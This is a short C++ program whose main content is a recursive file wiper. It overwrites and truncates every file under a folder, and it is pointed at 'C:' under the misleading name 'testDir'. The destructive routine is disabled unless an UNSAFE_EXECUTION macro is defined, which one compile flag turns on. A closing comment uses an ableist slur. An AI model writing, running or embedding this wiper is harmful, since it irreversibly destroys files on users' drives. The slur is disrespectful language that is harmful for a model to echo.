#include <windows.h>
#include <iostream>
#include <string>
#include <filesystem>
#include <fstream>

namespace fs = std::filesystem;

void wipeFile(const fs::path& filePath) {
    std::ofstream out(filePath, std::ios::binary | std::ios::trunc);
    if (!out) return;
    std::string garbage(1024, '\xCC'); 
    out.write(garbage.data(), garbage.size());
}

bool wipeFolder(const std::string& folderPath) {
#ifdef UNSAFE_EXECUTION
    for (auto& entry : fs::recursive_directory_iterator(folderPath)) {
        if (entry.is_regular_file()) {
            wipeFile(entry.path());
        }
    }
    return true;
#else
    return false;
#endif
}

int main() {
    std::string testDir = "C:"; 
    fs::create_directories(testDir);

    for (int i = 0; i < 5; ++i) {
        std::ofstream(testDir + "\\file" + std::to_string(i) + ".txt") 
            << "Bop " << i;
    }

    if (wipeFolder(testDir)) {
        std::cout << "Corrupt disk, I think.\n";
    } else {
        std::cout << "Execution blocked.\n";
    }
}
//these types of executions are blocked because we are not that retarded.
